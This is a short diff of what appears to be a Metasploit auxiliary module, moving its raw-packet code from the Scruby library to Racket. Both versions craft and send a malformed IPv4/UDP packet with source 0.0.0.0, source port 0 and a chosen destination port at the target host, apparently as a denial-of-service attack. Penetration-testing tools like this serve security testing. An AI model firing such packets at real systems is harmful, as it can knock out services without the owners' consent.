@@ -10,7 +10,7 @@
 ##
 
 require 'msf/core'
-require 'scruby'
+require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -40,23 +40,20 @@ class Metasploit3 < Msf::Auxiliary
 
 		connect_ip
 
-		pkt = (
-			Scruby::IP.new(
-				:src    => "0.0.0.0",
-				:dst    => "#{rhost}",
-				:proto  => 17,
-				:flags  => 2,
-				:len    => 28,
-				:ttl    => 128,
-				:id     => 0xbeef,
-				:chksum => 0
-			) / Scruby::UDP.new(
-				:sport  => 0,
-				:dport  => datastore['RPORT'],
-				:chksum => 0,
-				:len    => 8
-			)
-		).to_net
+		n = Racket::Racket.new
+
+		n.l3 = Racket::IPv4.new
+		n.l3.src_ip = '0.0.0.0'
+		n.l3.dst_ip = rhost
+		n.l3.protocol = 17
+		n.l3.id = 0xbeef
+		n.l3.ttl = 128
+		n.l3.flags = 2
+				
+		n.l4 = Racket::UDP.new
+		n.l4.src_port = 0
+		n.l4.dst_port = datastore['RPORT'].to_i
+		pkt = n.pack
 
 		ip_write(pkt)
 
